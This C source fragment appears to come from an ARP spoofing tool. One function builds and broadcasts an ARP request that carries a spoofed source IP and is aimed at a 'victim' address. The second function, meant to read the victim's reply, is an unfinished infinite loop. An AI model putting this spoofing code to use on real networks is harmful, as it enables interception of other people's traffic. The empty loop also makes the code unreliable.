#include "network/network.h"

int send_packet_to_brodcast(const int sock, struct sockaddr_ll *device,
                            const uint8_t *my_mac_address,
                            const char *spoofed_ip_source, const char *victim_ip)
{
    t_ether_trame ether_trame;
    p_arp_packet arp_packet;

    DEBUG_LOG("arp packet creation");
    if (create_arp_packet(&arp_packet, ARPOP_REQUEST,
                          ETH_BRODCAST, victim_ip,
                          my_mac_address, spoofed_ip_source))
    {
        error("create_arp_packet():");
        return 1;
    }

    DEBUG_LOG("ether trame creation");
    if (create_ethernet_trame(&ether_trame, ETH_BRODCAST, my_mac_address, &arp_packet))
    {
        error("create_ethernet_tram():");
        return 1;
    }

    DEBUG_LOG("sendto");
    if (sendto(sock, &ether_trame, ETH_HEADER_LENGTH + ARP_HEADER_LENGTH, 0, (const struct sockaddr *)device, sizeof(*device)) < 0)
    {
        error("sendto():");
        return 1;
    }
    printf("[+] Send packet to brodcast\n");

    return 0;
}

int get_victim_response(const int sock, const char *victim_ip, uint8_t *victime_mac_adresse)
{
    int rep = 1;
    printf("[*] Listening target response\n");
    while (rep)
    {
    }

    return 0;
}